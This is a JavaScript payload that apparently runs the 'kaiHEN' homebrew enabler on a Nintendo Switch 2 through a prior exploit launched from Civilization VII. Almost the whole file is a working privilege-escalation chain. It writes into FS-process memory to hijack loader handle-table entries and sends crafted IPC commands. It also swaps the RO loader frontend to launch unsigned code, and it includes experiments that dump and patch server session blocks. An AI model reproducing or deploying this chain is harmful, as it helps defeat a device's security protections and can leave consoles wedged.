// kaiHEN payload — start kaiHEN through CivSwitchFS's promoted session.
//
// Requires: the main CivSwitchFS payload succeeded on this boot
// (globalThis.fsKaihen) and the kaiHEN files are staged on the SD card
// (tools/kaihen.mjs does both). Runs the full chain:
// endpoint → layout → notifier → pm → loader copy → api workers → donor →
// gate test → RO-frontend launch → activate → handoff → ldr:ro → bootstrap.

import coreRuntime from "./core/runtime.mjs";
import {createContext, khLog, hex, check, loadLedger, stageDone,
    stageRecord, arenaSlots, ensureArena, SD_MANIFEST, HEN_TITLE}
    from "./kaihen/state.mjs";
import {armEndpoint, readFs, writeFs} from "./kaihen/endpoint.mjs";
import {sendContext} from "./kaihen/wire-context.mjs";
import runtime from "./core/runtime.mjs";
import {deriveLayout, findLoaderRoot, readThreadRing} from "./kaihen/layout.mjs";
import {dumpChainState} from "./kaihen/diff.mjs";
import {threadSendProbe} from "./kaihen/threadsend.mjs";
import {spinReadProbe} from "./kaihen/spinread.mjs";
import {sessionBlockProbe} from "./kaihen/sessionblock.mjs";
import {instantSendProbe} from "./kaihen/instant-send.mjs";
import {openNotifier, exportHandle, openInspectionDomain, copyLoaderRoot}
    from "./kaihen/objects.mjs";
import {verifyNativeStubs, openPmSessions} from "./kaihen/pm.mjs";
import {verifyEventCode, prepareApiWorkers, prepareGatedWorker,
    releaseGatedWorker, joinGatedWorker, workerFinished, workerSendResults}
    from "./kaihen/workers.mjs";
import {prepareDonor, cleanupDonor} from "./kaihen/donor.mjs";
import {openCodeFileSystem, openCodeFileSystemViaDomain, adoptCodeFileSystem,
    captureCodeFile,
    codeDomain, donorDomainRow,
    verifyAdapterTypes, bindSessions} from "./kaihen/codefs.mjs";
import {Gate, prepareGateEvent} from "./kaihen/gate.mjs";
import {launchRoFrontend} from "./kaihen/launch.mjs";
import {activateRoProcess, verifyHandoff} from "./kaihen/activate.mjs";
import {connectRoFrontend} from "./kaihen/ro.mjs";
import {runBootstrap} from "./kaihen/bootstrap.mjs";
import {openSdCard, sdGetEntryType, sdReadFile, sdWriteFile, sdOpenFile,
    sdFileSize, ensureSdDirectories, removeSdFile, createSdFile,
    sdWriteFileChunk, sdCommit, relocateSdRelease, sdSkipCheckPresent}
    from "./kaihen/sdcard.mjs";
import {RO_TITLE, readU64LE, arenaAlloc, track, u64Bytes, bytesToHex}
    from "./kaihen/state.mjs";
import {buildCmif, bareSendTransport, cmifSend} from "./kaihen/wire.mjs";
import {sha256} from "./kaihen/sha256.mjs";

const {waitMs, closeHandle, log, sendIPC} = coreRuntime;

// Materialize staged sink data (from chunk payloads) onto the SD card.
// Files stream from the sink allocation to the SD card in 64 KiB chunks —
// big files never pass through a full-size JS array (heap safety).
async function materializeSinkFiles(context) {
    const sink = globalThis.__KH_SINK;
    const manifest = globalThis.__KH_SINK_MANIFEST;
    if (!sink || !manifest || !sink.complete) {
        await khLog("no staged sink data; SD files must already be present");
        return false;
    }
    const sd = openSdCard(context);
    for (const file of manifest.files) {
        const base = Number(sink.base) + file.offset;
        const present = sdGetEntryType(context, sd, file.path);
        if (present.transport === 0 && present.result === 0) {
            const existing = sdOpenFile(context, sd, file.path, 1);
            let size = 0n;
            try { size = sdFileSize(context, existing); }
            finally { closeHandle(existing); }
            if (size === BigInt(file.size)) {
                await khLog("staged " + file.path + " already correct");
                continue;
            }
        }
        ensureSdDirectories(context, sd, file.path);
        removeSdFile(context, sd, file.path);
        createSdFile(context, sd, file.path, file.size);
        const handle = sdOpenFile(context, sd, file.path, 3);
        let wrote = 0;
        try {
            for (let at = 0; at < file.size; at += 0x10000) {
                const size = Math.min(0x10000, file.size - at);
                const chunk = coreRuntime.read_bytes(
                    BigInt(base + at), size);
                sdWriteFileChunk(context, handle, at, chunk);
                wrote += size;
            }
        } finally { closeHandle(handle); }
        sdCommit(context, sd);
        check(wrote === file.size,
            "staged " + file.path + " wrote " + wrote + " of " + file.size);
        await khLog("staged " + file.path + " (" + file.size + " bytes)");
    }
    return true;
}

async function verifySdFiles(context) {
    const sd = openSdCard(context);
    const missing = [];
    for (const [name, item] of Object.entries(globalThis.__KH_MANIFEST || {})) {
        const entry = sdGetEntryType(context, sd, item.path);
        if (!(entry.transport === 0 && entry.result === 0)) missing.push(name);
    }
    return missing;
}


// Report SD state for every manifest file (present + exact size).
async function sdFileStatus(context) {
    const sd = openSdCard(context);
    const out = {};
    for (const [name, item] of Object.entries(globalThis.__KH_MANIFEST || {})) {
        const entry = sdGetEntryType(context, sd, item.path);
        if (!(entry.transport === 0 && entry.result === 0)) {
            out[name] = {present: false};
            continue;
        }
        const handle = sdOpenFile(context, sd, item.path, 1);
        try {
            const size = sdFileSize(context, handle);
            out[name] = {present: true, size: size.toString(),
                ok: size === BigInt(item.size)};
        } finally {
            closeHandle(handle);
        }
    }
    return out;
}

export async function run() {
    await khLog("=== kaiHEN start for CivSwitchFS (ported by ave) ===");
    const mode = globalThis.__KH_MODE === "status" ? "status" : "run";
    globalThis.__KH_MODE = "run";

    if (mode === "status") {
        // Status mode only needs the promoted session for SD access.
        const state = globalThis.fsKaihen;
        if (!state || !state.domainSession) {
            await khLog("NO SESSION: run the main CivSwitchFS payload first");
            return;
        }
        const context = {state,
            fspSrv: {handle: state.domainSession.handle,
                rootObj: state.domainSession.rootObj},
            candidateHandle: state.candidateHandle, handles: []};
        ensureArena(context);
        arenaSlots(context);
        try {
            const status = await sdFileStatus(context);
            for (const [name, item] of Object.entries(status))
                await khLog("SD file " + name + " " + (item.present ?
                    (item.ok ? "ok" : "size " + item.size +
                        " != " + globalThis.__KH_MANIFEST[name].size) :
                    "missing"));
            const sink = globalThis.__KH_SINK;
            if (sink) await khLog("sink " + (sink.complete ? "complete" :
                sink.wrote + "/" + sink.total));
            const materialized = await materializeSinkFiles(context);
            if (materialized) {
                const after = await sdFileStatus(context);
                for (const [name, item] of Object.entries(after))
                    await khLog("SD file " + name + " " + (item.present ?
                        (item.ok ? "ok" : "size " + item.size) : "missing"));
            }
        } catch (error) {
            await khLog("status failed: " +
                (error && error.message ? error.message : error));
        }
        return;
    }

    const context = createContext();
    // One launch per boot: the launch stage's RO-frontend swap consumes the
    // boot even when a later stage fails (mount swapped, original RO gone),
    // and any session wedged by that run stays wedged — a re-run gets fresh
    // handles pointing at the same dead shared objects (run142: busy 150/150
    // again on a boot whose previous run had wedged the loader session).
    // Refuse any second attempt after a launch; the fix is a power-cycle.
    if (stageRecord("launch") || stageRecord("complete")) {
        await khLog("this boot already ran a kaiHEN launch attempt — " +
            "power-cycle the console before running again");
        check(false, "one launch per boot: power-cycle first");
    }

    // Fail fast when the SD card lacks the chain's files: the launch
    // stage consumes the boot, and a missing bootstrap/ro/hen/game would
    // waste it (the sink-absent path used to discover this only at the
    // bootstrap stage, after the swap). Entry-presence only — sizes are
    // verified by sdFileStatus in status mode.
    if (globalThis.__KH_MANIFEST) {
        const optional = name => Boolean(globalThis.__KH_MANIFEST[name] &&
            globalThis.__KH_MANIFEST[name].optional);
        // Flag file /kaihen/civswitchfs-skipcheck: skip file-identity
        // (size) checks so a different kaiHEN build can run; presence is
        // still enforced.
        context.sdSkipCheck = sdSkipCheckPresent(context);
        if (context.sdSkipCheck)
            await khLog("SD: /kaihen/civswitchfs-skipcheck present — " +
                "file identity checks skipped (presence only)");
        let missing = await verifySdFiles(context);
        if (missing.length) {
            // Self-heal: if the kaiHEN release was extracted straight onto
            // the card, move the files into place before failing.
            const moved = await relocateSdRelease(context, missing);
            if (moved.length) missing = await verifySdFiles(context);
        }
        const requiredMissing = missing.filter(name => !optional(name));
        if (requiredMissing.length) {
            await khLog("required SD files missing: " +
                requiredMissing.join(", ") +
                " — stage /kaihen/bin (kaiHEN launcher or manual SD" +
                " copy) and restart the game");
            check(false, "required SD files missing: " +
                requiredMissing.join(", "));
        }
        const optionalMissing = missing.filter(optional);
        if (optionalMissing.length)
            await khLog("WARNING: optional SD files missing (the HEN" +
                " runs without them; holding R needs hbmenu): " +
                optionalMissing.join(", "));
        await khLog("SD manifest present: " +
            Object.keys(globalThis.__KH_MANIFEST).join(", "));
    }
    ensureArena(context);
    arenaSlots(context);
    // Close handles leaked by earlier failed runs on this boot (they release
    // the FS-side sm/pm sessions those runs opened; a stale pm:dmnt lease is
    // what failed run 8's lookup with 0x615 after two leaked attempts).
    const leaked = globalThis.__KH_TRACKED;
    if (Array.isArray(leaked) && leaked.length) {
        let closed = 0;
        for (let i = leaked.length - 1; i >= 0; i--) {
            try { await closeHandle(leaked[i].handle); closed++; }
            catch (error) { /* dead handles close with an error; fine */ }
        }
        // A reclaimed handle may be the cached SD session (the status eval
        // opens and caches it in globalThis.__KH.sd). Drop the cache so
        // openSdCard reopens instead of sending on a closed handle — boot 19
        // failed sd-verify with every file "missing" exactly this way.
        globalThis.__KH.sd = null;
        await khLog("reclaimed " + closed + "/" + leaked.length +
            " leaked handles from a failed run");
    }
    globalThis.__KH_TRACKED = null;
    const stages = [];

    const stage = async (name, action) => {
        // Diagnostic skip hook: globalThis.__KH_SKIP (set by a prelude payload
        // from tools/kaihen.mjs --skip) lets a boot with a dead prerequisite
        // (e.g. pm:dmnt quota exhausted by earlier leaked lookups) exercise
        // the stages after it.
        if (Array.isArray(globalThis.__KH_SKIP) && globalThis.__KH_SKIP.includes(name)) {
            await khLog("--- stage: " + name + " SKIPPED");
            stageDone(name, {ok: true, skipped: true});
            return undefined;
        }
        await khLog("--- stage: " + name);
        stages.push(name);
        const result = await action();
        stageDone(name, {ok: true});
        return result;
    };

    try {
        await stage("endpoint", () => armEndpoint(context));
        await stage("layout", async () => {
            await deriveLayout(context);
            await findLoaderRoot(context);
            await readThreadRing(context);
        });
        await stage("sdk-stubs", () => {
            verifyEventCode();
            verifyNativeStubs(context);
        });
        await stage("notifier", () => openNotifier(context));
        await stage("pm", () => openPmSessions(context, RO_TITLE));
        await stage("loader-copy", async () => {
            await openInspectionDomain(context);
            await copyLoaderRoot(context);
            // The instant-send probe runs FIRST: its entire premise is that
            // nothing sits between the copy and the first send.
            await instantSendProbe(context, RO_TITLE);
            // State-diff dump in the author engine's proof schema, before any
            // other send on the copied handle (reference runs/switch2-5T5Brx).
            await dumpChainState(context);
            // The TS/SR/SB diagnostics each copy the root and send a doomed
            // plain code-open (by design — they watch the death). The author's
            // flow NEVER sent a doomed request: copy -> code-open 4s later ->
            // launch -> bootstrap all lived. Skippable via --skip probes.
            const skipProbes = Array.isArray(globalThis.__KH_SKIP) &&
                globalThis.__KH_SKIP.includes("probes");
            if (skipProbes) {
                await khLog("TS/SR/SB probes skipped (--skip probes)");
            } else {
                await threadSendProbe(context, RO_TITLE);
                await spinReadProbe(context, RO_TITLE);
                await sessionBlockProbe(context, RO_TITLE);
            }
            if (Array.isArray(globalThis.__KH_SKIP) &&
                    globalThis.__KH_SKIP.includes("dx")) {
                await khLog("DX experiments skipped (--skip dx)");
            } else {
            // DX17: DX16 located the copied session's server-side
            // registration (a row containing {loaderObject, ?, 0x7d,
            // holderVptr}, with a session block ~0x60 before it carrying the
            // FS-side handle and refcount, linked into a manager queue).
            // Watch that block field-by-field across the copy, the first
            // send (death), and after — the flip that coincides with the
            // kernel peer close is the kill switch.
            const layout17 = context.layout;
            const loaderObject17 = context.loaderRoot.object;
            const findRegistryRow = async () => {
                for (let at = layout17.captureStart;
                        at < layout17.captureEnd; at += 0x4000) {
                    const len = Math.min(0x4000, layout17.captureEnd - at);
                    const bytes = await readFs(context, at, len);
                    for (let k = 0; k + 0x20 <= len; k += 8) {
                        if (readU64LE(bytes, k) !== BigInt(loaderObject17))
                            continue;
                        if (readU64LE(bytes, k + 0x18) !==
                                BigInt(layout17.holderVptr)) continue;
                        return at + k;
                    }
                }
                return 0;
            };
            const dumpBlock = async (phase, row) => {
                if (!row) return;
                const block = await readFs(context, row - 0x60, 0x90);
                let out = "";
                for (let k = 0; k < 0x90; k += 8)
                    out += (out ? " " : "") +
                        hex(row - 0x60 + k) + ":" +
                        hex(Number(readU64LE(block, k)));
                await khLog("DX17 " + phase + " " + out);
            };
            const row17 = await findRegistryRow();
            await khLog("DX17 registry row " + hex(row17));
            await dumpBlock("before", row17);
            const entry17 = layout17.table +
                (context.inspectionDomain.root - 1) * 0x30;
            const oldPair17 = await readFs(context, entry17 + 0x20, 0x10);
            const borrow17 = await readFs(context,
                context.loaderRoot.entry + 0x20, 0x10);
            let handle17 = 0;
            // DX18: prebuild the probe so NOTHING (no log, no read) sits
            // between the copy reply and the first send — decides whether
            // the peer close is synchronous inside the copy command or a
            // race we can win.
            buildCmif(arenaSlots(context).pkt2, {cmd: 810});
            await writeFs(context, entry17 + 0x20, borrow17);
            try {
                const reply17 = cmifSend(context.inspectionDomain.handle,
                    {pkt: arenaSlots(context).pkt, control: true, cmd: 1,
                        input: [context.inspectionDomain.root & 0xff,
                            context.inspectionDomain.root >> 8 & 0xff,
                            context.inspectionDomain.root >> 16 & 0xff,
                            context.inspectionDomain.root >> 24 & 0xff],
                        rawWords: 9});
                if (reply17.transport === 0 && reply17.moves &&
                        reply17.moves.length) {
                    handle17 = reply17.moves[0];
                    const rcInstant = bareSendTransport(handle17,
                        arenaSlots(context).pkt2);
                    track(context, handle17, "dx17-copy");
                    await khLog("DX18 instant 810 rc=" + hex(rcInstant) +
                        " handle=" + hex(handle17));
                    await dumpBlock("after-instant", row17);
                    await dumpBlock("after-copy", row17);
                    buildCmif(arenaSlots(context).pkt2, {cmd: 810});
                    const rc17 = bareSendTransport(handle17,
                        arenaSlots(context).pkt2);
                    await khLog("DX17 810 rc=" + hex(rc17) +
                        " handle=" + hex(handle17));
                    await dumpBlock("after-death", row17);
                    // second look: does the row itself move or clear?
                    const row17b = await findRegistryRow();
                    await khLog("DX17 registry row after death " + hex(row17b));
                } else {
                    await khLog("DX17 copy transport=" + hex(reply17.transport));
                }
            } finally {
                await writeFs(context, entry17 + 0x20, oldPair17);
            }
            // DX19: every copy so far went through the FRESH inspection
            // domain. The promoted session (fspSrv) is the one whose own-
            // object copies provably work (fsRootPlain). Borrow the PROMOTED
            // session's entry for the copy and probe instantly.
            const promoted19 = context.fspSrv;
            const entry19 = layout17.table +
                (promoted19.rootObj - 1) * 0x30;
            const oldPair19 = await readFs(context, entry19 + 0x20, 0x10);
            let handle19 = 0;
            await writeFs(context, entry19 + 0x20, borrow17);
            try {
                const reply19 = cmifSend(promoted19.handle,
                    {pkt: arenaSlots(context).pkt, control: true, cmd: 1,
                        input: [promoted19.rootObj & 0xff,
                            promoted19.rootObj >> 8 & 0xff,
                            promoted19.rootObj >> 16 & 0xff,
                            promoted19.rootObj >> 24 & 0xff],
                        rawWords: 9});
                if (reply19.transport === 0 && reply19.moves &&
                        reply19.moves.length) {
                    handle19 = reply19.moves[0];
                    buildCmif(arenaSlots(context).pkt2, {cmd: 810});
                    const rc19 = bareSendTransport(handle19,
                        arenaSlots(context).pkt2);
                    await khLog("DX19 promoted-copy instant 810 rc=" +
                        hex(rc19) + " handle=" + hex(handle19) +
                        " moves=" + reply19.moves.length);
                    if (rc19 === 0) {
                        track(context, handle19, "dx19-promoted-copy");
                        context.loaderCopy.handle = handle19;
                        await khLog("DX19 PROMOTED-SESSION COPY IS SENDABLE");
                    }
                } else {
                    await khLog("DX19 promoted copy transport=" +
                        hex(reply19.transport) + " result=" +
                        hex(reply19.result === undefined ? -1 :
                            reply19.result));
                }
            } finally {
                await writeFs(context, entry19 + 0x20, oldPair19);
            }
            }  // end DX experiments (skip boundary)
        });
        await stage("api-workers", () => prepareApiWorkers(context));
        await stage("sd-materialize", () => materializeSinkFiles(context));
        await stage("sd-verify", async () => {
            const status = await sdFileStatus(context);
            const bad = [];
            for (const [name, item] of Object.entries(status)) {
                if (!item.present || (!context.sdSkipCheck && !item.ok))
                    bad.push(name + (item.present ? "(size)" : "(missing)"));
            }
            await khLog("SD check" + (context.sdSkipCheck ?
                " (skipcheck: presence only): " : ": ") + (bad.length ?
                "problems: " + bad.join(", ") : "all present"));
            const optional = Object.keys(globalThis.__KH_MANIFEST || {})
                .filter(name => globalThis.__KH_MANIFEST[name].optional);
            const required = bad.filter(name =>
                !optional.includes(name.replace(/\(.*\)$/, "")));
            check(required.length === 0,
                "required SD files failed verification: " + required.join(", "));
        });

        // Donor: the RO image from the SD card, the policy from the real
        // RO title's CodeFS through the copied Loader root.
        await stage("donor", async () => {
            let codefs;
            if (context.instantCodeFs) {
                // The instant-send probe already opened the CodeFS through
                // the domain-routed WithContext path (run69: transport 0,
                // result 0, handle moved) — adopt it directly.
                codefs = adoptCodeFileSystem(context, context.instantCodeFs,
                    context.instantCodeFsInfo, context.instantCodeFsAdded);
                await khLog("code fs adopted from IS (added=" +
                    hex(context.instantCodeFsAdded) + ")");
            } else {
                try {
                    codefs = openCodeFileSystem(context, context.loaderCopy.handle,
                        RO_TITLE);
                    await khLog("code fs opened via copied root");
                } catch (error) {
                    await khLog("copied-root code open failed: " +
                        (error && error.message ? error.message : error) +
                        "; trying domain route");
                    const loaderObjectId = Math.floor(
                        (context.loaderRoot.entry - context.layout.table) / 0x30) + 1;
                    check(loaderObjectId > 0 && loaderObjectId <= 0x4000,
                        "loader object id out of table range");
                    codefs = await openCodeFileSystemViaDomain(context,
                        context.inspectionDomain.handle, loaderObjectId, RO_TITLE);
                }
            }
            await khLog("code fs opened (signed=" + codefs.codeInfo.isSigned + ")");
            check(codefs.added, "donor requires a domain-added CodeFS object");
            const npdm = await captureCodeFile(context, codefs.added,
                "main.npdm");
            await khLog("captured main.npdm (" + npdm.size + " bytes, sha " +
                npdm.sha256.slice(0, 12) + ")");
            const sd = openSdCard(context);
            const roMain = sdReadFile(context, sd,
                globalThis.__KH_MANIFEST.ro.path, 0x100000);
            await codeDomain(context, codefs.handle, codefs.added);
            await prepareDonor(context,
                {"main": roMain.bytes, "main.npdm": npdm.bytes});
            await donorDomainRow(context);
            verifyAdapterTypes(context);
        });
        await stage("bind-sessions", () => bindSessions(context));
        await stage("gate-event", () => prepareGateEvent(context));
        await stage("gate-test", async () => {
            // Park the LOADER's server session row — the row the launch
            // gates (the author's launch.cjs parks root.targetDomain = the
            // loader's domain; their test-gate parked ownDomain only because
            // their daemon's memory access didn't traverse it — OUR endpoint
            // storage lives in our own domain session, so parking ownDomain
            // wedges our only memory primitive, runs 90-95).
            const domain = context.inspectionDomain;
            const row = context.bound.rows.find(r =>
                r.domain === context.loaderRoot.domain);
            check(row, "the loader's bound server session is missing");
            const copy = await exportHandle(context, row.receive,
                "loader server readiness");
            const gate = new Gate(context, row, copy.handle, context.gateEvent);
            try {
                await gate.parkSession();
                await khLog("GTA parked the loader row alone");
                await gate.restore();
                await khLog("GTA restored");
                context.gateTest = {verified: true};
            } finally {
                await gate.restore();
            }
            await closeHandle(copy.handle);
        });
        await stage("launch", async () => {
            // Stash the rich launch proof on the ledger so a failed run's
            // postmortem can read the full request-by-request record.
            globalThis.__KH.launchProof = await launchRoFrontend(context);
        });
        await stage("activate", async () => {
            await activateRoProcess(context, RO_TITLE);
            await verifyHandoff(context);
        });
        await stage("donor-cleanup", () => cleanupDonor(context));
        await stage("ro-frontend", async () => {
            connectRoFrontend(context);
            await khLog("ldr:ro frontend connected");
            check(context.fsRootPlain,
                "the plain fsRoot clone is missing (created with the notifier)");
        });
        await stage("fs-process", async () => {
            context.fsProcess = await exportHandle(context, 0xffff8001,
                "FS process");
        });
        await stage("bootstrap", () => runBootstrap(context));

        await khLog("=== HEN IS RUNNING ===");
        await khLog("Close Civilization VII normally; hold R while opening " +
            "a Switch 2 game twice.");
        stageDone("complete", {ok: true});
    } catch (error) {
        await khLog("FAILED at stage '" +
            (stages.length ? stages[stages.length - 1] : "?") + "': " +
            (error && error.message ? error.message : error));
        if (error && error.stack) await log(String(error.stack).split("\n")
            .slice(0, 3).join(" | "));
        // The boot may still be usable; report what completed.
        await khLog("completed stages: " + stages.join(" > "));
        throw error;
    } finally {
        if (!context.henStartup) {
            // Failed run: release every tracked handle (reverse order) so the
            // boot stays reusable — leaked sm/pm sessions otherwise exhaust
            // service quotas within a few attempts on the same boot.
            for (let i = context.handles.length - 1; i >= 0; i--) {
                try { await closeHandle(context.handles[i].handle); }
                catch (error) { /* closing a dead handle is harmless */ }
            }
            globalThis.__KH_TRACKED = null;
            // The closed set may include the SD session cached in
            // globalThis.__KH.sd — drop the cache so later evals reopen
            // instead of sending on a closed handle (run 26 showed every SD
            // file "missing" and create failing 0xE401 from exactly this).
            if (globalThis.__KH) globalThis.__KH.sd = null;
        }
        if (context.loaderServerExport && context.henStartup) {
            try { await closeHandle(context.loaderServerExport.handle); }
            catch (error) { await khLog("export close failed"); }
        }
        if (context.fsProcess && context.henStartup) {
            try { await closeHandle(context.fsProcess.handle); }
            catch (error) { await khLog("fs process close failed"); }
        }
    }
}
